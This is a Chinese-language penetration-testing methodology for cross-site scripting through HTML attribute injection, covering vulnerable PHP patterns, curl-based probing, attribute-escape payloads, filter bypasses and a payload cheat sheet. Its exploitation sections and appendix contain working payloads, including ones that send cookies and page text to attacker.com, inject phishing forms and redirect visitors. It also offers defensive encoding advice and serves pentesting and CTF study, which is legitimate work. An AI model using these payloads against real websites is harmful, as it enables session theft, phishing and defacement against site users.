# HTML 属性上下文 XSS 注入攻击方法论

**文档版本:** 1.0  
**创建日期:** 2026 年 3 月 14 日  
**适用场景:** 用户输入被反射到 HTML 属性值且无适当编码的场景

---

## 第一部分：文档概述

### 1.1 编写目的

本方法论旨在为渗透测试人员提供一套标准化、可复现的 HTML 属性上下文 XSS 注入测试与利用流程。重点针对用户输入被反射到 HTML 属性（如 value、src、href 等）且仅使用 trim() 等弱过滤而无 htmlspecialchars() 编码的场景，指导测试人员如何构造 Payload 实现 JavaScript 执行。

### 1.2 适用范围

本文档适用于以下场景：
- 用户输入被反射到 HTML 属性值中（value="USER_INPUT"）
- 属性值使用双引号包裹但双引号未过滤
- 应用仅使用 trim() 去除空格而无其他编码
- 表单验证失败后用户输入被回显
- 无 Content-Security-Policy 头保护

### 1.3 读者对象

- 执行渗透测试任务的安全工程师
- CTF 竞赛参赛选手
- 进行代码审计的安全分析师

---

## 第二部分：核心渗透技术专题

### 专题：HTML 属性上下文 XSS 注入攻击

#### 2.1 技术介绍

**漏洞原理：**

HTML 属性上下文 XSS 是指用户输入被直接嵌入到 HTML 标签的属性值中，且未进行适当的 HTML 实体编码。攻击者可以通过注入事件处理器（如 onfocus、onclick）或跳出属性值注入新标签来执行 JavaScript。

**脆弱代码示例：**
```php
// PHP 脆弱代码
$name = trim($_POST["name"]);  // 仅 trim，无 htmlspecialchars
echo '<input type="text" value="' . $name . '">';
// 输出：<input type="text" value="attacker_payload">
```

**攻击本质：**
- **数据与代码未分离**：用户输入被当作 HTML 属性值的一部分
- **缺少上下文编码**：未根据 HTML 属性上下文进行实体编码
- **事件处理器注入**：利用 onfocus、onclick 等事件执行 JS

#### 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **联系表单** | 名称/邮箱回显 | 验证失败后输入被反射到 value 属性 |
| **注册表单** | 用户名/邮箱回显 | 字段验证错误后保留用户输入 |
| **搜索功能** | 搜索关键词回显 | 搜索结果页显示搜索词 |
| **文件上传** | 上传者信息回显 | 上传表单回显名称/邮箱 |
| **个人资料** | 编辑表单预填充 | 用户资料字段预填充到 input |
| **评论系统** | 评论者信息回显 | 评论表单记住用户信息 |

#### 2.3 漏洞探测方法

##### 2.3.1 黑盒测试

**步骤 1: 识别输入反射点**
```bash
# 提交测试 payload 到表单
curl -X POST 'http://target/contact.php' \
  -d 'name=TEST_XSS' \
  -d 'email=test@test.com' \
  -d 'message=Test message'

# 检查响应中 TEST_XSS 的位置
curl -X POST 'http://target/contact.php' \
  -d 'name=TEST_XSS' \
  -d 'email=test@test.com' \
  -d 'message=' | grep -i "TEST_XSS"

# 如果出现在 value="TEST_XSS" 中，可能存在属性上下文 XSS
```

**步骤 2: 测试特殊字符过滤**
```bash
# 测试双引号
curl -X POST 'http://target/contact.php' \
  -d 'name="test"' \
  -d 'email=' -d 'message=' | grep 'value="'

# 如果响应包含 value=""test""，双引号未过滤

# 测试尖括号
curl -X POST 'http://target/contact.php' \
  -d 'name=<script>' \
  -d 'email=' -d 'message=' | grep 'value="'

# 如果响应包含 value="<script>"，尖括号未过滤

# 测试事件处理器
curl -X POST 'http://target/contact.php' \
  -d 'name=" onmouseover=alert(1) "' \
  -d 'email=' -d 'message=' | grep 'value="'
```

**步骤 3: 判断渲染上下文**
```bash
# HTML 标签上下文：直接输出在标签之间
# <p>USER_INPUT</p>

# HTML 属性上下文：输出在属性值中
# <input value="USER_INPUT">

# JavaScript 上下文：输出在 script 标签内
# <script>var name = "USER_INPUT"</script>
```

##### 2.3.2 白盒测试

**代码审计关键词（PHP）：**
```php
// 搜索用户输入反射点
echo 'value="' . $_POST[
echo 'value="' . $_GET[
echo "value=\"{$_POST[

// 搜索不安全的输出
echo $name
echo $email
echo $message

// 搜索缺失的编码
// 应该使用但未使用：
htmlspecialchars($name, ENT_QUOTES, 'UTF-8')
htmlentities($name)
```

**脆弱模式识别：**
```php
// 脆弱模式 1: 仅 trim
$name = trim($_POST["name"]);
echo '<input value="' . $name . '">';

// 脆弱模式 2: 条件回显
if (!empty($_POST["name"])) {
    $name = $_POST["name"];  // 无编码
}
echo '<input value="' . $name . '">';

// 脆弱模式 3: 短标签
<?= $name ?>  // 无编码直接输出
```

#### 2.4 漏洞利用方法

##### 2.4.1 基础属性逃逸

**场景 1: 双引号未过滤**
```bash
# 目标：<input type="text" value="USER_INPUT">

# Payload 1: 注入事件处理器
" onfocus=alert(1) autofocus="

# 完整 HTML:
# <input type="text" value="" onfocus=alert(1) autofocus="">

# 利用 curl 测试:
curl -X POST 'http://target/contact.php' \
  --data-urlencode 'name=" onfocus=alert(1) autofocus="' \
  --data 'email=' \
  --data 'message=' | grep 'onfocus'
```

**Payload 构造原理：**
```
原始：value="TEST"
注入：value="" onfocus=alert(1) autofocus=""
分解:
  value=""           # 闭合原属性
  onfocus=alert(1)   # 注入事件处理器
  autofocus=""       # 添加自动聚焦属性触发事件
```

**场景 2: 单引号上下文**
```bash
# 目标：<input value='USER_INPUT'>

# Payload:
' onfocus=alert(1) autofocus='

# 如果单引号被过滤，尝试双引号：
" onfocus=alert(1) autofocus="
```

**场景 3: 无引号包裹**
```bash
# 目标：<input value=USER_INPUT>

# Payload:
onfocus=alert(1) autofocus=x

# 完整 HTML:
# <input value=onfocus=alert(1) autofocus=x>
# 浏览器解析为：value="onfocus" onfocus="alert(1)" autofocus="x"
```

##### 2.4.2 高级利用技术

**技术 1: 使用 autofocus 自动触发**
```bash
# 无需用户交互，页面加载即执行
" onfocus=alert(document.domain) autofocus="

# 兼容各浏览器的变体：
" onpointerdown=alert(1) autofocus="
" onanimationstart=alert(1) autofocus="
```

**技术 2: 数据外带**
```bash
# 外带页面内容
" onfocus="fetch('http://attacker.com/?data='+encodeURIComponent(document.body.innerText.substring(0,500)))" autofocus="

# 外带 Cookie（如果存在）
" onfocus="fetch('http://attacker.com/?cookie='+document.cookie)" autofocus="

# 外带到 DNSLog
" onfocus="fetch('http://xxxx.burpcollaborator.net')" autofocus="
```

**技术 3: DOM 操纵**
```bash
# 修改页面内容
" onfocus="document.querySelector('h1').innerHTML='HACKED'" autofocus="

# 添加钓鱼表单
" onfocus="var d=document.createElement('div');d.innerHTML='<form action=http://attacker.com><input name=p><button>Submit</button></form>';document.body.prepend(d)" autofocus="

# 重定向
" onfocus="window.location='http://attacker.com'" autofocus="
```

##### 2.4.3 不同属性上下文利用

**value 属性（文本输入框）：**
```bash
# Input 字段
<input type="text" value="PAYLOAD">
<input type="email" value="PAYLOAD">
<input type="password" value="PAYLOAD">

# Payload:
" onfocus=alert(1) autofocus="
```

**src 属性（图片）：**
```bash
# 如果用户输入控制 src
<img src="USER_INPUT">

# Payload:
" onerror=alert(1) src="x

# 完整 HTML:
# <img src="" onerror=alert(1) src="x">
```

**href 属性（链接）：**
```bash
# 如果用户输入控制 href
<a href="USER_INPUT">Click</a>

# Payload:
" onclick="alert(1)" href="javascript:void(0)

# 完整 HTML:
# <a href="" onclick="alert(1)" href="javascript:void(0)">Click</a>
```

**placeholder 属性：**
```bash
# 较少见，但如果存在
<input placeholder="USER_INPUT">

# Payload:
" onfocus=alert(1) autofocus="
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 绕过引号过滤

**如果双引号被过滤：**
```bash
# 方法 1: 使用单引号
' onfocus=alert(1) autofocus='

# 方法 2: 使用反引号（ES6）
` onfocus=alert(1) autofocus=`

# 方法 3: 使用 HTML 实体
&#34; onfocus=alert(1) autofocus=&#34;

# 方法 4: 使用 URL 编码
%22%20onfocus=alert(1)%20autofocus=%22
```

**如果单引号被过滤：**
```bash
# 使用双引号
" onfocus=alert(1) autofocus="

# 使用 HTML 实体
&#39; onfocus=alert(1) autofocus=&#39;
```

##### 2.5.2 绕过空格过滤

**如果空格被过滤：**
```bash
# 方法 1: 使用 Tab
"	onfocus=alert(1)	autofocus="

# 方法 2: 使用换行
"
onfocus=alert(1)
autofocus="

# 方法 3: 使用斜杠
"/onfocus=alert(1)/autofocus="

# 方法 4: 使用注释
"/**/onfocus=alert(1)/**/autofocus="
```

##### 2.5.3 绕过事件处理器过滤

**如果 onfocus 被过滤：**
```bash
# 使用其他事件
onclick=alert(1)
onmouseover=alert(1)
onmouseenter=alert(1)
onmousedown=alert(1)
onpointerdown=alert(1)
ontouchstart=alert(1)
onanimationstart=alert(1)

# 自动触发变体（无需用户交互）
autofocus onfocus=alert(1)
<svg onload=alert(1)>
```

**如果 alert 被过滤：**
```bash
# 使用其他函数
confirm(1)
prompt(1)
console.log(1)
print()

# 使用字符串拼接
alert('X'+'S'+'S')
alert(String.fromCharCode(88,83,83))

# 使用 eval
eval('ale'+'rt(1)')
```

##### 2.5.4 绕过标签过滤

**如果 < 和 > 被过滤但属性上下文可注入：**
```bash
# 不需要标签，直接注入属性
" onfocus=alert(1) autofocus="

# 如果只能注入到属性值，这正是我们需要的
```

##### 2.5.5 绕过弱正则过滤

**场景：应用仅过滤 "XSS" 字符串**
```bash
# 方法 1: 使用其他 payload
" onfocus=alert(1) autofocus="

# 方法 2: 大小写绕过
" onfocus=Alert(1) autofocus="

# 方法 3: 字符串拼接
" onfocus=eval('ale'+'rt(1)') autofocus="
```

**场景：应用过滤 <[a-z/] 正则**
```bash
# 使用大写字母
<SCRIPT>alert(1)</SCRIPT>

# 使用非字母标签
<1>alert(1)</1>

# 使用自闭合标签
<style/onload=alert(1)>
```

---

## 第三部分：附录

### 3.1 常用 Payload 速查表

| **类别** | **上下文** | **Payload 示例** | **说明** |
| :--- | :--- | :--- | :--- |
| **基础逃逸** | value 属性 | `" onfocus=alert(1) autofocus="` | 双引号未过滤 |
| **基础逃逸** | value 属性 | `' onfocus=alert(1) autofocus='` | 单引号未过滤 |
| **基础逃逸** | 无引号属性 | `onfocus=alert(1) autofocus=x` | 属性无引号包裹 |
| **自动触发** | 任意属性 | `" ontouchstart=alert(1) autofocus="` | 移动端兼容 |
| **自动触发** | 任意属性 | `" onanimationstart=alert(1) autofocus="` | 动画事件 |
| **数据外带** | 任意属性 | `" onfocus="fetch('http://attacker.com/?c='+document.cookie)" autofocus="` | 窃取 Cookie |
| **数据外带** | 任意属性 | `" onfocus="fetch('http://attacker.com/?d='+btoa(document.body.innerText))" autofocus="` | Base64 外带 |
| **DOM 操纵** | 任意属性 | `" onfocus="document.body.style.backgroundColor='red'" autofocus="` | 修改样式 |
| **DOM 操纵** | 任意属性 | `" onfocus="document.querySelector('h1').innerHTML='HACKED'" autofocus="` | 修改内容 |
| **钓鱼攻击** | 任意属性 | `" onfocus="var d=document.createElement('div');d.innerHTML='<form><input name=p></form>';document.body.appendChild(d)" autofocus="` | 注入表单 |
| **绕过空格** | 任意属性 | `"	onfocus=alert(1)	autofocus="` | Tab 代替空格 |
| **绕过引号** | 任意属性 | `` ` onfocus=alert(1) autofocus= ` `` | 反引号 |

### 3.2 事件处理器参考表

| **事件** | **触发条件** | **自动触发** | **浏览器兼容性** |
| :--- | :--- | :--- | :--- |
| onfocus | 元素获得焦点 | 需 autofocus | 所有浏览器 |
| onclick | 鼠标点击 | 需用户交互 | 所有浏览器 |
| onmouseover | 鼠标移入 | 需用户交互 | 所有浏览器 |
| onmouseenter | 鼠标进入 | 需用户交互 | 所有浏览器 |
| onmousedown | 鼠标按下 | 需用户交互 | 所有浏览器 |
| onpointerdown | 指针按下 | 需用户交互 | 现代浏览器 |
| ontouchstart | 触摸开始 | 需用户交互 | 移动设备 |
| onanimationstart | 动画开始 | 自动 | 现代浏览器 |
| ontransitionend | 过渡结束 | 需 CSS 过渡 | 现代浏览器 |
| onload | 资源加载完成 | 自动（img/svg） | 所有浏览器 |
| onerror | 加载错误 | 自动（img/svg） | 所有浏览器 |

### 3.3 编码函数参考

**PHP 安全编码：**
```php
// HTML 属性上下文编码
htmlspecialchars($input, ENT_QUOTES, 'UTF-8');

// 完整示例
$name = htmlspecialchars($_POST["name"], ENT_QUOTES, 'UTF-8');
echo '<input type="text" value="' . $name . '">';
```

**其他语言：**
```java
// Java
StringEscapeUtils.escapeHtml4(input);

// Python
html.escape(input, quote=True)

// JavaScript (Node.js)
he.encode(input, {useNamedReferences: true})

// .NET
System.Web.HttpUtility.HtmlEncode(input)
```

### 3.4 检测工具推荐

**自动化扫描：**
```bash
# XSStrike
python xsstrike.py -u "http://target/contact.php" --post "name=test&email=test"

# Dalfox
dalfox url "http://target/contact.php" --method POST --data "name=test"

# Gxss
gxss -c 100 | waybackurls | httpx | dalfox pipe
```

**手工测试：**
```bash
# curl + grep
curl -X POST 'http://target/contact.php' \
  -d 'name=" onfocus=alert(1) autofocus="' \
  | grep -i 'onfocus'

# Burp Suite
# 使用 Repeater 手动修改 payload
# 使用 Intruder 批量测试不同 payload
```

---

## 参考资源

- [OWASP - XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger - XSS into HTML Attribute Context](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [MDN - HTML Attributes Reference](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes)
- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
